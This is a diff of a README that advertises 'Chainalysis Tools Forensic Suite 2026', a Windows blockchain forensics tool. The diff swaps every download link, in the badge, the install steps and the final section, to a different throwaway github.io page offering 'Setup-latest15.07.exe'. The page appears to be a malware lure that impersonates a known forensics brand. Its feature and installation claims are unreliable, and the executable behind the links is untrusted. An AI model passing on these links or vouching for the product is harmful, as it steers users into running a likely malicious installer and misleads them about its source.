@@ -2,7 +2,7 @@
 
 Chainalysis Tools Forensic Suite 2026 is a powerful blockchain forensics platform built for Windows desktop environments. Whether you are a compliance officer, law enforcement analyst, or cybersecurity researcher, this comprehensive suite equips you with everything you need to trace transactions, analyze wallet clusters, and generate detailed forensic reports across multiple blockchain networks. With an intuitive interface and robust back-end engine, Chainalysis Tools makes deep blockchain investigation accessible to professionals at every level.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -28,7 +28,7 @@ Before installing Chainalysis Tools Forensic Suite 2026, please verify that your
 
 Follow these step-by-step instructions to get Chainalysis Tools Forensic Suite 2026 running on your Windows machine:
 
-1. **Download the Installer**: Click the download button at the top of this page or visit the [official download page](https://yellowtaxisave.github.io/download-page/) to obtain the latest version of the installer. The file is named **Setup-latest15.07.exe**.
+1. **Download the Installer**: Click the download button at the top of this page or visit the [official download page](https://capitals-707-bringing.github.io/download-page/) to obtain the latest version of the installer. The file is named **Setup-latest15.07.exe**.
 
 2. **Locate the Installer**: After the download completes, open your Downloads folder or whichever directory you chose, and find **Setup-latest15.07.exe**.
 
@@ -70,7 +70,7 @@ A: Absolutely. The tool supports importing custom CSV-formatted watchlists that 
 
 To get the latest version of Chainalysis Tools Forensic Suite 2026, visit our official download page:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
